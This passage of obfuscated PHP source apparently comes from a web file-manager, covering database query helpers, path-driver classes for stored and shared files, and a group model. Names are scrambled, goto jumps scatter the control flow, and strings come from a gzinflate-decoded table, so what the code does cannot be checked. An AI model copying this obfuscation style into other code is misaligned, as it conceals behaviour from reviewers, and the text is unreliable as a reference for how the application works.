$this->parseKey($¼¶ç¶ìÒ)); $“Âõæğ¤ = array(); if ($¸û¢ğÈ°) { foreach ($¸û¢ğÈ° as $ƒ§¸·í¾ => $¬àşµï) { $“Âõæğ¤[$¬àşµï[$†€ñ·ª¸[31]]] = array($†€ñ·ª¸[32] => $¬àşµï[$†€ñ·ª¸[31]], $†€ñ·ª¸[33] => $¬àşµï[$†€ñ·ª¸[34]], $†€ñ·ª¸[35] => (bool) (strtoupper($¬àşµï[$†€ñ·ª¸[36]]) === $†€ñ·ª¸[979]), $†€ñ·ª¸[37] => $¬àşµï[$†€ñ·ª¸[38]], $†€ñ·ª¸[39] => strtolower($¬àşµï[$†€ñ·ª¸[40]]) == $†€ñ·ª¸[41], $†€ñ·ª¸[42] => strtolower($¬àşµï[$†€ñ·ª¸[43]]) == $†€ñ·ª¸[44]); } } return $“Âõæğ¤; } public function getTables($€¹Í‡òš = '') { $Ÿˆ¼‡ÍÒ =& $_SERVER[ÕŸ²ó÷å]; if (!empty($€¹Í‡òš)) { $üøñ“½ = $Ÿˆ¼‡ÍÒ[980] . $€¹Í‡òš . $Ÿˆ¼‡ÍÒ[981]; } else { $üøñ“½ = $Ÿˆ¼‡ÍÒ[982]; } $ŒøŠüÚ = $this->query($üøñ“½); $„±°ó³¨ = array(); foreach ($ŒøŠüÚ as $Çó¼¢„­ => $™¦“Ó©É) { $„±°ó³¨[$Çó¼¢„­] = current($™¦“Ó©É); } return $„±°ó³¨; } public function replace($ÅŠö•†, $·èª©ƒŠ = array()) { $µ•¡Î ş =& $_SERVER[ÕŸ²ó÷å]; foreach ($ÅŠö•† as $áíò¼—’ => $ö‘†´û¡) { $¾òê…ÛÄ = $this->parseValue($ö‘†´û¡); if (is_scalar($¾òê…ÛÄ)) { $Ì¦™Ä®¡[] = $¾òê…ÛÄ; $—¸¾è„ö[] = $this->parseKey($áíò¼—’); } } $ùâ‚Å¯ = $µ•¡Î ş[983] . $this->parseTable($·èª©ƒŠ[$µ•¡Î ş[365]]) . $µ•¡Î ş[984] . implode($µ•¡Î ş[50], $—¸¾è„ö) . $µ•¡Î ş[985] . implode($µ•¡Î ş[50], $Ì¦™Ä®¡) . $µ•¡Î ş[986]; return $this->execute($ùâ‚Å¯); } public function insertAll($ğÓë…ã«, $«¾Ê¯î¹ = array(), $ªğÃº“Á = false) { $ïû¸ê˜ =& $_SERVER[ÕŸ²ó÷å]; if (!is_array($ğÓë…ã«[0])) { return !1; } $äÙ¢åÔ = array_keys($ğÓë…ã«[0]); $šŒ¢Š‡Ö = array(); foreach ($ğÓë…ã« as $»ÑÃÀÙ) { $¼¡ÓÜ  = array(); foreach ($»ÑÃÀÙ as $½¯Â­ç  => $‹Áïçú“) { $‹Áïçú“ = $this->parseValue($‹Áïçú“); if (is_scalar($‹Áïçú“)) { $¼¡ÓÜ [] = $‹Áïçú“; } } $šŒ¢Š‡Ö[] = $ïû¸ê˜[346] . implode($ïû¸ê˜[50], $¼¡ÓÜ ) . $ïû¸ê˜[986]; } array_walk($äÙ¢åÔ, array($this, $ïû¸ê˜[987])); $ÊÔè•ôï = ($ªğÃº“Á ? $ïû¸ê˜[988] : $ïû¸ê˜[989]) . $ïû¸ê˜[990] . $this->parseTable($«¾Ê¯î¹[$ïû¸ê˜[365]]) . $ïû¸ê˜[984] . implode($ïû¸ê˜[50], $äÙ¢åÔ) . $ïû¸ê˜[991] . implode($ïû¸ê˜[50], $šŒ¢Š‡Ö); return $this->execute($ÊÔè•ôï); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÌÆöìôÊ =& $_SERVER[ÕŸ²ó÷å]; $this->error = mysql_errno() . $ÌÆöìôÊ[4] . mysql_error($this->_linkID); if ($ÌÆöìôÊ[12] != $this->queryStr) { $this->error .= LNG($ÌÆöìôÊ[48]) . $this->queryStr; } think_trace($this->error, $ÌÆöìôÊ[12], $ÌÆöìôÊ[49]); return $this->error; } public function escapeString($¨ÂÉÈ©) { if ($this->_linkID) { return mysql_real_escape_string($¨ÂÉÈ©, $this->_linkID); } else { return mysql_escape_string($¨ÂÉÈ©); } } public function parseKey(&$¦œÜ‘£“, $÷¯ı’æû = true) { $ÍÈÙª°š =& $_SERVER[ÕŸ²ó÷å]; if ($÷¯ı’æû) { $¦œÜ‘£“ = $this->parseKeyCheck($¦œÜ‘£“); } if ($¦œÜ‘£“ != $ÍÈÙª°š[230] && !preg_match($ÍÈÙª°š[992], $¦œÜ‘£“)) { $¦œÜ‘£“ = $ÍÈÙª°š[470] . trim($¦œÜ‘£“, $ÍÈÙª°š[470]) . $ÍÈÙª°š[470]; } return $¦œÜ‘£“; } } goto DÕ£²Şñ; Dã¿Î¾Í±¥: $xpsobfaewr = $_SERVER[ÕŸ²ó÷å][688]; $_SERVER[¢¿ãÄÁ¤] = explode($_SERVER[ÕŸ²ó÷å][689], gzinflate(substr($_SERVER[ÕŸ²ó÷å][690], 10, -8))); $gwjiunoxme = $_SERVER[ÕŸ²ó÷å][691]; goto fµŞ•¯‘Ó»; d°÷¾²êµ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ƒ»»¦áé) { $this->pathParse = $ƒ»»¦áé; $this->model = Model($_SERVER[ÕŸ²ó÷å][1421]); } public function getPath($™Óá¿í¾) { return trim($™Óá¿í¾, $_SERVER[ÕŸ²ó÷å][8]); } public function pathFather($ùœÀôö±) { $¸²õÖ±Í = $this->parse($ùœÀôö±); $¸²õÖ±Í = $this->infoSimple($ùœÀôö±); return $¸²õÖ±Í ? $¸²õÖ±Í[$_SERVER[ÕŸ²ó÷å][202]] : !1; } public function pathThis($†“Ğœ—ğ) { $³ä‰«Ç = $this->infoSimple($†“Ğœ—ğ); return $³ä‰«Ç ? $³ä‰«Ç[$_SERVER[ÕŸ²ó÷å][32]] : !1; } public function getPathOuter($’™¤ü¢ì) { if (!$’™¤ü¢ì) { return $’™¤ü¢ì; } $®ËÇ´º« = $this->parse($’™¤ü¢ì); return KodIO::make($®ËÇ´º«[$_SERVER[ÕŸ²ó÷å][484]]); } public function copyFolderFromIO($íÃ‰Š´æ, $àáÂüê, $ØÙÆ—ÄÄ, $¯•âƒÖ¤, $÷‡º›ÓÇ) { $…Šªş = $this->model->copyFolderFromIO($íÃ‰Š´æ, $àáÂüê, $ØÙÆ—ÄÄ, $¯•âƒÖ¤, $÷‡º›ÓÇ); return KodIO::make($…Šªş); } public function isParentOf($ëÃä°‡æ, $Á…›¬çÔ) { return $this->model->isParentOf($ëÃä°‡æ, $Á…›¬çÔ); } public function mkfile($ÂÊ€ Ô, $«Ÿ®ºˆŞ = '', $ãöãËÈ° = REPEAT_RENAME) { $ÓÁÕ±œğ =& $_SERVER[ÕŸ²ó÷å]; $ó‡’¨‰¬ = $this->parse($ÂÊ€ Ô); $ÂÊ€ Ô = $ó‡’¨‰¬[$ÓÁÕ±œğ[484]]; for ($ÙÜøîşˆ = 0; $ÙÜøîşˆ < count($ó‡’¨‰¬[$ÓÁÕ±œğ[1422]]); $ÙÜøîşˆ++) { $Ö÷äÏ¸õ = $ó‡’¨‰¬[$ÓÁÕ±œğ[1422]][$ÙÜøîşˆ]; if ($ÙÜøîşˆ == count($ó‡’¨‰¬[$ÓÁÕ±œğ[1422]]) - 1) { $ÂÊ€ Ô = $this->model->mkfile($ÂÊ€ Ô, $Ö÷äÏ¸õ, $«Ÿ®ºˆŞ, $ãöãËÈ°); break; } $ÂÊ€ Ô = $this->model->mkdir($ÂÊ€ Ô, $Ö÷äÏ¸õ, REPEAT_SKIP); } return $this->getPathOuter($ÂÊ€ Ô); } public function mkdir($øÔßõ§Ø, $œ•Ô¯ù¸ = REPEAT_SKIP) { $ÙÔÔëÎ =& $_SERVER[ÕŸ²ó÷å]; $ëì”Ãü = $this->parse($øÔßõ§Ø); $øÔßõ§Ø = $ëì”Ãü[$ÙÔÔëÎ[484]]; for ($Å¸âÔ‹– = 0; $Å¸âÔ‹– < count($ëì”Ãü[$ÙÔÔëÎ[1422]]); $Å¸âÔ‹–++) { $“ïŸ¿À÷ = $ëì”Ãü[$ÙÔÔëÎ[1422]][$Å¸âÔ‹–]; $øÔßõ§Ø = $this->model->mkdir($øÔßõ§Ø, $“ïŸ¿À÷, $œ•Ô¯ù¸); } return $this->getPathOuter($øÔßõ§Ø); } public function copyFile($Ş«İóğ‡, $ù¨ÔÇÚÏ, $ƒûéĞ™ = REPEAT_REPLACE) { $É‹´è… =& $_SERVER[ÕŸ²ó÷å]; $‘èîêó = $this->parse($ù¨ÔÇÚÏ); $á»“â«à = $this->model->copy($Ş«İóğ‡, $‘èîêó[$É‹´è…[484]], $ƒûéĞ™, $‘èîêó[$É‹´è…[97]]); return $á»“â«à ? $this->getPathOuter($á»“â«à) : !1; } public function moveFile($”÷Ø»Û’, $—Åûñ©², $——ŞºÔı = REPEAT_REPLACE) { $¸¸ù¼™ =& $_SERVER[ÕŸ²ó÷å]; $¦×‡¸Òê = $this->parse($—Åûñ©²); $°»ì©×’ = $this->model->move($”÷Ø»Û’, $¦×‡¸Òê[$¸¸ù¼™[484]], $——ŞºÔı, $¦×‡¸Òê[$¸¸ù¼™[97]]); return $°»ì©×’ ? $this->getPathOuter($°»ì©×’) : !1; } public function copy($½® ”£Á, $¬äÕè¤ª, $¿Å ’»Ä = REPEAT_REPLACE, $­ßŠÀœ = false) { $ù­šñ¥ = $this->parse($¬äÕè¤ª); $‡êŞø‰Ò = $this->model->copy($½® ”£Á, $ù­šñ¥[$_SERVER[ÕŸ²ó÷å][484]], $¿Å ’»Ä, $­ßŠÀœ); return $‡êŞø‰Ò ? $this->getPathOuter($‡êŞø‰Ò) : !1; } public function moveSameAllow() { } public function move($í¶Ñ¿Ö©, $¤ÉöŞùÜ, $—½£ŞÕµ = REPEAT_REPLACE, $ÚçÌ¼÷Î = false) { $±ØØôÍ = $this->parse($¤ÉöŞùÜ); $ãöìµ£® = $this->model->move($í¶Ñ¿Ö©, $±ØØôÍ[$_SERVER[ÕŸ²ó÷å][484]], $—½£ŞÕµ, $ÚçÌ¼÷Î); return $ãöìµ£® ? $this->getPathOuter($ãöìµ£®) : !1; } public function remove($¦®ˆóÈÀ, $ŒŞ±†áÜ = true) { return $this->model->remove($¦®ˆóÈÀ, $ŒŞ±†áÜ); } public function rename($Ä´ÇåÌØ, $ ²ğ³–ü) { $Ø‹ØÃîå = $this->model->rename($Ä´ÇåÌØ, $ ²ğ³–ü); return $Ø‹ØÃîå ? $this->getPathOuter($Ä´ÇåÌØ) : $Ø‹ØÃîå; } public function size($Ê„ºÇûÀ) { $Õœ¬øï = $this->infoSimple($Ê„ºÇûÀ); return $Õœ¬øï ? $Õœ¬øï[$_SERVER[ÕŸ²ó÷å][89]] : 0; } public function infoSimple($İ ½‰ÂÉ) { return $this->model->sourceInfo($İ ½‰ÂÉ); } public function info($°»±¼­—) { return $this->infoParse($°»±¼­—); } public function infoAuth($Îä·—á) { return $this->infoParse($Îä·—á, !1, !0); } public function infoWithChildren($ò…”İ±Ñ) { return $this->infoParse($ò…”İ±Ñ, !0); } protected function infoParse($¿ÉâÂ’š, $èá×¶¹Ş = false, $áªÊ†Æœ = false) { if (!$èá×¶¹Ş) { return $this->model->pathInfo($¿ÉâÂ’š, $áªÊ†Æœ); } return $this->model->pathInfoMore($¿ÉâÂ’š); } public function infoFullSimple($ØÕ‹©Ù˜) { $ö¼ˆÆ»× =& $_SERVER[ÕŸ²ó÷å]; $ş½Ùş„ = explode($ö¼ˆÆ»×[8], $ØÕ‹©Ù˜); $ €ˆóË = implode($ö¼ˆÆ»×[8], array_splice($ş½Ùş„, 1)); return $this->model->pathInfoByPath($ş½Ùş„[0], $ €ˆóË); } public function infoFull($¤•é¶Ù÷) { $Õ´ê·÷˜ = $this->infoFullSimple($¤•é¶Ù÷); return is_array($Õ´ê·÷˜) ? $this->model->pathInfo($Õ´ê·÷˜[$_SERVER[ÕŸ²ó÷å][203]]) : !1; } public function hashSimple($Ÿ©¿ŞêÈ) { $¬ÈÕª =& $_SERVER[ÕŸ²ó÷å]; $ØÍíŞÌ„ = $this->infoWithChildren($Ÿ©¿ŞêÈ); return $ØÍíŞÌ„[$¬ÈÕª[180]][$¬ÈÕª[681]]; } public function hashMd5($ç¢’ŞÒ…) { $¬èöæÎå =& $_SERVER[ÕŸ²ó÷å]; $ôŠ•Ìó = $this->infoWithChildren($ç¢’ŞÒ…); return $ôŠ•Ìó[$¬èöæÎå[180]][$¬èöæÎå[556]]; } public function exist($æ¸¤‚—ì) { $ïğµÁİŒ =& $_SERVER[ÕŸ²ó÷å]; $­ĞØ‚½Ÿ = $this->parse($æ¸¤‚—ì); if (!$­ĞØ‚½Ÿ[$ïğµÁİŒ[97]]) { return $this->isFile($æ¸¤‚—ì) || $this->isFolder($æ¸¤‚—ì); } $ƒêà˜œ = array($ïğµÁİŒ[486] => $­ĞØ‚½Ÿ[$ïğµÁİŒ[484]], $ïğµÁİŒ[32] => $­ĞØ‚½Ÿ[$ïğµÁİŒ[97]]); $”·®“Å® = $this->model->where($ƒêà˜œ)->find(); return $”·®“Å® ? !0 : !1; } public function isFile($ÁêŞ¶) { $ŒîÔúİ© =& $_SERVER[ÕŸ²ó÷å]; $¨ïğÛ×Õ = $this->infoSimple($ÁêŞ¶); return $¨ïğÛ×Õ && $¨ïğÛ×Õ[$ŒîÔúİ©[494]] == $ŒîÔúİ©[238] ? !0 : !1; } public function isFolder($ßşÀÓ©¸) { $€¿ºèÖ‚ =& $_SERVER[ÕŸ²ó÷å]; $°œÆĞÔ = $this->infoSimple($ßşÀÓ©¸); return $°œÆĞÔ && $°œÆĞÔ[$€¿ºèÖ‚[494]] == $€¿ºèÖ‚[101] ? !0 : !1; } public function listPath($âïÏõóÈ, $´÷‘œïî = false) { $°¶¡ó‹ =& $_SERVER[ÕŸ²ó÷å]; if ($âïÏõóÈ == $°¶¡ó‹[12]) { return !1; } $ùáñªÙÇ = array($°¶¡ó‹[486] => $âïÏõóÈ); if ($´÷‘œïî) { return $this->model->listSource($ùáñªÙÇ, -1); } return $this->model->listSource($ùáñªÙÇ); } public function has($“Ï×Ñ®–, $”Ü‹îÔ‰ = false, $“¸ƒûØó = null) { $—œËË´ş =& $_SERVER[ÕŸ²ó÷å]; $Ñ…•”ì  = $this->infoWithChildren($“Ï×Ñ®–); if ($”Ü‹îÔ‰) { return array($—œËË´ş[250] => $Ñ…•”ì [$—œËË´ş[250]], $—œËË´ş[249] => $Ñ…•”ì [$—œËË´ş[249]]); } return $“¸ƒûØó ? $Ñ…•”ì [$—œËË´ş[250]] : $Ñ…•”ì [$—œËË´ş[249]]; } public function listAll($Ì˜ÕÜàÓ) { $³„Şö×¼ = IO::info($this->pathParse[$_SERVER[ÕŸ²ó÷å][97]]); if (!$³„Şö×¼) { return array(); } return $this->model->listAll($Ì˜ÕÜàÓ); } public function getContent($¹ä£ı–¨) { return $this->model->getContent($¹ä£ı–¨); } public function setContent($ÜàÛäê, $îİÌÂÓ„ = '') { return $this->model->setContent($ÜàÛäê, $îİÌÂÓ„); } public function fileSubstr($—û„¸Œş, $ÚİšØ˜, $³ÄôØ‘ü) { return $this->model->fileSubstr($—û„¸Œş, $ÚİšØ˜, $³ÄôØ‘ü); } public function download($×çÓ†¿›, $ÁãéÎ = '') { $Ù’Á‰‰’ = get_path_father($ÁãéÎ); $—’®Â»Ù = get_path_this($ÁãéÎ); $¸±ÔÍÑÅ = $this->model->fileInfoGet($×çÓ†¿›); $èßàÎáÉ = IO::copy($¸±ÔÍÑÅ[$_SERVER[ÕŸ²ó÷å][97]], $Ù’Á‰‰’, !1, $—’®Â»Ù); return $èßàÎáÉ; } public function setModifyTime($âèì¸ºù, $…æææ† = '') { $â”´»áÏ =& $_SERVER[ÕŸ²ó÷å]; if (!$âèì¸ºù) { return; } $this->model->where(array($â”´»áÏ[500] => $âèì¸ºù))->save(array($â”´»áÏ[98] => $…æææ†)); } public function upload($ÈúãïÀñ, $úç§ºñ¤, $ÓÏÇñÀ = false, $¾£è¢Ó¢ = REPEAT_REPLACE) { $Ò¶†ú² =& $_SERVER[ÕŸ²ó÷å]; $âŞšÑ²ç = $this->parse($ÈúãïÀñ); $ø±àÆé = $this->model->addFile($âŞšÑ²ç[$Ò¶†ú²[484]], $úç§ºñ¤, $âŞšÑ²ç[$Ò¶†ú²[97]], $ÓÏÇñÀ, $¾£è¢Ó¢); return $this->getPathOuter($ø±àÆé); } public function uploadFileByID($å³§êœ, $¸áÉ›Ø€, $êìŒÎ§Ë) { $¸–ÃÈÛï =& $_SERVER[ÕŸ²ó÷å]; $ËòŠñÈÎ = $this->parse($å³§êœ); $¼ò·•¯Á = $this->model->addFileByFileID($ËòŠñÈÎ[$¸–ÃÈÛï[484]], $¸áÉ›Ø€, $ËòŠñÈÎ[$¸–ÃÈÛï[97]], $êìŒÎ§Ë); return $this->getPathOuter($¼ò·•¯Á); } public function addFileByRemote($Ù»ö Ü´, $¤ñâàå«, $ü„‡ÈÃá = array(), $‰×µáæ¦ = '', $³å÷í’Œ) { $¿¹ç‘üø =& $_SERVER[ÕŸ²ó÷å]; $ÅØäê¯³ = $this->parse($Ù»ö Ü´); $‰×µáæ¦ = empty($‰×µáæ¦) ? $ÅØäê¯³[$¿¹ç‘üø[97]] : $‰×µáæ¦; $Í©Š¶æ¡ = $this->model->addFileByRemote($ÅØäê¯³[$¿¹ç‘üø[484]], $¤ñâàå«, $‰×µáæ¦, $ü„‡ÈÃá, $³å÷í’Œ); return $this->getPathOuter($Í©Š¶æ¡); } public function uploadLink($ÇÎóÒ²˜, $ì–÷êÜ‰ = 0) { $ëàÚêŠä =& $_SERVER[ÕŸ²ó÷å]; $ºÎİî© = $this->parse($ÇÎóÒ²˜); $õü—®ƒ = _get($GLOBALS[$ëàÚêŠä[7]], $ëàÚêŠä[1423]); $°’ªØôå = _get($GLOBALS[$ëàÚêŠä[7]], $ëàÚêŠä[1424]); $ÇÎóÒ²˜ = Model($ëàÚêŠä[683])->createFileName($ºÎİî©[$ëàÚêŠä[97]], $õü—®ƒ, $°’ªØôå); return IO::uploadLink($ÇÎóÒ²˜, $ì–÷êÜ‰); } public function fileNameAuto($Ñµ´Öƒœ, $å„Èİœ´, $Üüœæşœ = REPEAT_REPLACE, $’ÎßĞĞæ = false) { return $this->model->fileNameAuto($Ñµ´Öƒœ, $å„Èİœ´, $Üüœæşœ, $’ÎßĞĞæ); } public function fileNameExist($İÆ¹˜†, $ûŒó…æ‰) { return $this->model->fileNameExist($İÆ¹˜†, $ûŒó…æ‰); } protected function _fileOut($ı£êÒá™, $ˆÇ­ñ¿ = false, $ØÈŸ™úº = false, $¨Ö”Ñî‰ = '', $Ä“Çç“½ = false) { $é±ŠÖƒ¡ =& $_SERVER[ÕŸ²ó÷å]; $‘ÓÏãË = $this->model->sourceInfo($ı£êÒá™); if ($‘ÓÏãË[$é±ŠÖƒ¡[494]] == $é±ŠÖƒ¡[101]) { header($é±ŠÖƒ¡[1425]); die; } $Ï«·¯¡° = $this->model->fileInfoGet($ı£êÒá™); $¨Ö”Ñî‰ = $Ï«·¯¡°[$é±ŠÖƒ¡[556]] ? $Ï«·¯¡°[$é±ŠÖƒ¡[556]] : $¨Ö”Ñî‰; $ŞŠ“ôíİ = isset($GLOBALS[$é±ŠÖƒ¡[192]]) && is_array($GLOBALS[$é±ŠÖƒ¡[192]]) ? $GLOBALS[$é±ŠÖƒ¡[192]][$é±ŠÖƒ¡[32]] : $‘ÓÏãË[$é±ŠÖƒ¡[32]]; if ($Ä“Çç“½) { return IO::fileOutServer($Ï«·¯¡°[$é±ŠÖƒ¡[97]], $ˆÇ­ñ¿, $ŞŠ“ôíİ, $¨Ö”Ñî‰); } IO::fileOut($Ï«·¯¡°[$é±ŠÖƒ¡[97]], $ˆÇ­ñ¿, $ŞŠ“ôíİ, $¨Ö”Ñî‰); } public function fileOut($œ«¬ª¹†, $ÓÜàıŞì = false, $óµ´ˆ½ = false, $ÖÇê¬ì› = '') { $this->_fileOut($œ«¬ª¹†, $ÓÜàıŞì, $óµ´ˆ½, $ÖÇê¬ì›); } public function fileOutServer($‘îËÄ†ê, $½•¹„ = false, $ ‡£âçô = false, $µó‡¬´è = '') { $this->_fileOut($‘îËÄ†ê, $½•¹„, $ ‡£âçô, $µó‡¬´è, !0); } protected function _fileOutImage($ƒ ³•‚, $ûç˜È¸Ì = 250) { $”şŞ¾ê =& $_SERVER[ÕŸ²ó÷å]; $Áè¸â½ = $this->model->pathInfo($ƒ ³•‚); if ($Áè¸â½[$”şŞ¾ê[494]] == $”şŞ¾ê[101]) { show_json($”şŞ¾ê[1426] . $ƒ ³•‚, !1); } $¥±ıùß´ = $this->model->fileInfoGet($ƒ ³•‚); $Áè¸â½[$”şŞ¾ê[193]] = $¥±ıùß´[$”şŞ¾ê[97]]; $GLOBALS[$”şŞ¾ê[192]] = $Áè¸â½; IO::fileOutImage($¥±ıùß´[$”şŞ¾ê[97]], $ûç˜È¸Ì); } public function fileOutImage($ œ™ëèÓ, $Ê‡ˆ¨‡û = 250) { $this->_fileOutImage($ œ™ëèÓ, $Ê‡ˆ¨‡û); } public function fileOutImageServer($‘á´×´Ä, $ìâ²Œ©ú = 250) { $this->_fileOutImage($‘á´×´Ä, $ìâ²Œ©ú); } public function link($ª†°ûëé, $×£ã…À = '') { $Ş¯‹Åô» = $this->model->fileInfoGet($ª†°ûëé); return IO::link($Ş¯‹Åô»[$_SERVER[ÕŸ²ó÷å][97]], $×£ã…À); } protected function parse($¾×ºÁ“ì) { $ä³ëôúŸ =& $_SERVER[ÕŸ²ó÷å]; if (strstr($¾×ºÁ“ì, $ä³ëôúŸ[8]) === !1) { return array($ä³ëôúŸ[502] => intval($¾×ºÁ“ì), $ä³ëôúŸ[97] => $ä³ëôúŸ[12], $ä³ëôúŸ[1422] => array()); } $ëâçÄ = explode($ä³ëôúŸ[8], trim($¾×ºÁ“ì, $ä³ëôúŸ[8])); if (count($ëâçÄ) < 2) { show_tips(clear_html($¾×ºÁ“ì) . $ä³ëôúŸ[1427]); } return array($ä³ëôúŸ[502] => intval($ëâçÄ[0]), $ä³ëôúŸ[97] => $ëâçÄ[1], $ä³ëôúŸ[1422] => array_slice($ëâçÄ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($š¾ğ²ñÌ) { $this->pathParse = $š¾ğ²ñÌ; $this->model = Model($_SERVER[ÕŸ²ó÷å][1421]); } public function getPathOuter($·ÀâãÚì) { $èã¥±²â =& $_SERVER[ÕŸ²ó÷å]; if (!$·ÀâãÚì) { return $·ÀâãÚì; } $¬÷ã· = $this->parse($·ÀâãÚì); return trim(KodIO::makeShare($this->pathParse[$èã¥±²â[484]], $¬÷ã·[$èã¥±²â[484]]), $èã¥±²â[8]); } protected function infoParse($ø´·œÕ, $ò÷îî¤ô = false, $¤ÍÔÊ¥Á = false) { $á…Ûâ­ê =& $_SERVER[ÕŸ²ó÷å]; $•ŸŒ¶ó§ = $this->pathParse[$á…Ûâ­ê[484]]; $ÜÃÑİ÷é = trim($this->pathParse[$á…Ûâ­ê[1253]], $á…Ûâ­ê[8]); return Action($á…Ûâ­ê[1428])->sharePathInfo($•ŸŒ¶ó§, $ÜÃÑİ÷é, $ò÷îî¤ô); } public function infoFull($õ˜éÃØò) { $š±¼›£¾ =& $_SERVER[ÕŸ²ó÷å]; $ßªúâå = explode($š±¼›£¾[8], trim($õ˜éÃØò, $š±¼›£¾[8])); if (count($ßªúâå) > 1) { $†åö‚€‚ = implode($š±¼›£¾[8], array_splice($ßªúâå, 1)); $ë²úİ³È = $this->model->pathInfoByPath($ßªúâå[0], $†åö‚€‚); if (!$ë²úİ³È) { return !1; } $this->pathParse[$š±¼›£¾[1253]] = $ë²úİ³È[$š±¼›£¾[203]]; } return $this->infoParse($õ˜éÃØò); } public function listAll($ıÇƒÙÄÌ) { $®‡Ÿ¸¹ =& $_SERVER[ÕŸ²ó÷å]; $Ïƒõƒ– = IO::info($this->pathParse[$®‡Ÿ¸¹[97]]); if (!$Ïƒõƒ–) { return array(); } $Ø—½çğ– = $this->model->listAll($ıÇƒÙÄÌ); $õÅÎÛ¯µ = Model($®‡Ÿ¸¹[673])->getInfo($Ïƒõƒ–[$®‡Ÿ¸¹[674]]); foreach ($Ø—½çğ– as &$¦ßëí»Ï) { check_abort(); $¦ßëí»Ï[$®‡Ÿ¸¹[100]] = Action($®‡Ÿ¸¹[1428])->_shareItemeParse($¦ßëí»Ï[$®‡Ÿ¸¹[100]], $õÅÎÛ¯µ); } unset($¦ßëí»Ï); return $Ø—½çğ–; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($°şªÓ§è) { $this->pathParse = $°şªÓ§è; $this->model = Model($_SERVER[ÕŸ²ó÷å][1421]); } protected function infoParse($‡¬’‚ƒ¬, $øıíòğª = false, $…»¯ÈŸş = false) { $¹ˆšºô§ =& $_SERVER[ÕŸ²ó÷å]; return Action($¹ˆšºô§[1259])->sharePathInfo($this->pathParse[$¹ˆšºô§[97]], !0, $øıíòğª); } public function listPath($ÍÖğ†É–, $ò®µîêÚ = false) { $¢õÛ ±‰ =& $_SERVER[ÕŸ²ó÷å]; $Ï­˜‹ÚÊ = parent::listPath($ÍÖğ†É–, $ò®µîêÚ); if (!$Ï­˜‹ÚÊ) { return $Ï­˜‹ÚÊ; } if (is_array($Ï­˜‹ÚÊ[$¢õÛ ±‰[1429]])) { $Ï­˜‹ÚÊ[$¢õÛ ±‰[1429]] = Action($¢õÛ ±‰[1259])->shareItemInfo($Ï­˜‹ÚÊ[$¢õÛ ±‰[1429]]); } foreach ($Ï­˜‹ÚÊ as $îİ’Ñ¾ğ => $ıé‰ó™) { if (!in_array($îİ’Ñ¾ğ, array($¢õÛ ±‰[96], $¢õÛ ±‰[95]))) { continue; } foreach ($ıé‰ó™ as $Ü¦ĞÄÔƒ => $ôÎîğê‚) { $Ï­˜‹ÚÊ[$îİ’Ñ¾ğ][$Ü¦ĞÄÔƒ] = Action($¢õÛ ±‰[1259])->shareItemInfo($ôÎîğê‚); } } return $Ï­˜‹ÚÊ; } public function listAll($ßËÊËì³) { $´´ÖŒ¡× =& $_SERVER[ÕŸ²ó÷å]; $“æÚè‰ = IO::info($this->pathParse[$´´ÖŒ¡×[97]]); if (!$“æÚè‰) { return array(); } $Õ®û¤Õë = $this->model->listAll($ßËÊËì³); foreach ($Õ®û¤Õë as &$¯¼Ç¾Ğâ) { $¯¼Ç¾Ğâ[$´´ÖŒ¡×[100]] = Action($´´ÖŒ¡×[1259])->shareItemInfo($¯¼Ç¾Ğâ[$´´ÖŒ¡×[100]]); } unset($¯¼Ç¾Ğâ); return $Õ®û¤Õë; } } goto C®ùêù¥ƒ…; e‘…ˆå‹£: class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\155\x65" => "\147\x72\x6f\x75\x70\x5f\155\x65\164\x61", "\155\145\164\x61\106\151\x65\x6c\x64" => "\x67\x72\157\x75\x70\111\x44"); protected function cacheFunctionAlias($´¦ÌîÛ¹) { $úÏåì‚ê =& $_SERVER[ÕŸ²ó÷å]; return array($úÏåì‚ê[2054] => array($´¦ÌîÛ¹[0], $úÏåì‚ê[2055]), $úÏåì‚ê[2056] => array($´¦ÌîÛ¹[0], $úÏåì‚ê[2057])); } protected function getInfo($š­ƒèÑ÷, $©ãÄ¾ã = false) { $‚ªÈÁî = $this->getInfoSimple($š­ƒèÑ÷); if (!$‚ªÈÁî) { return !1; } if ($©ãÄ¾ã) { return $this->_listDataApplyItem($‚ªÈÁî); } return $this->cacheFunctionGet($_SERVER[ÕŸ²ó÷å][2058], $š­ƒèÑ÷); } protected function getInfoSimple($ƒëáşíŠ, $İ¼‚Š÷À = false) { $ËûëÙï½ =& $_SERVER[ÕŸ²ó÷å]; if ($İ¼‚Š÷À) { $ÏÚ‘Ÿñ¯ = array($ËûëÙï½[1972] => intval($ƒëáşíŠ)); $¨íÅ“³‘ = $this->where($ÏÚ‘Ÿñ¯)->find(); return is_array($¨íÅ“³‘) ? $¨íÅ“³‘ : array(); } return $this->cacheFunctionGet($ËûëÙï½[2059], $ƒëáşíŠ); } protected function groupAdd($Öí‚Î) { $İëÆ¯î =& $_SERVER[ÕŸ²ó÷å]; if (!$Öí‚Î[$İëÆ¯î[202]] && isset($Öí‚Î[$İëÆ¯î[1972]]) && $Öí‚Î[$İëÆ¯î[1972]] == 1) { if ($Ûóà¾«­ = $this->getInfoSimple($Öí‚Î[$İëÆ¯î[1972]], !0)) { return $Öí‚Î[$İëÆ¯î[1972]]; } } else { $Ûóà¾«­ = $this->getInfoSimple($Öí‚Î[$İëÆ¯î[202]]); if (!$Ûóà¾«­) { return !1; } } $õ÷’ô³û = $İëÆ¯î[603]; if ($Ûóà¾«­[$İëÆ¯î[593]]) { $õ÷’ô³û = $Ûóà¾«­[$İëÆ¯î[593]] . $Ûóà¾«­[$İëÆ¯î[1972]] . $İëÆ¯î[50]; } $ú³·š¢ä = array($İëÆ¯î[503] => $this->groupNameAuto($Öí‚Î[$İëÆ¯î[202]], $Öí‚Î[$İëÆ¯î[32]]), $İëÆ¯î[486] => $Öí‚Î[$İëÆ¯î[202]], $İëÆ¯î[661] => $õ÷’ô³û, $İëÆ¯î[2060] => $Öí‚Î[$İëÆ¯î[1958]], $İëÆ¯î[2061] => 0, $İëÆ¯î[1976] => 0); if (isset($Öí‚Î[$İëÆ¯î[1996]])) { $ú³·š¢ä[$İëÆ¯î[1996]] = $Öí‚Î[$İëÆ¯î[1996]]; } else { $èÀ†ş®  = $this->max($İëÆ¯î[1996]); if (!$èÀ†ş® 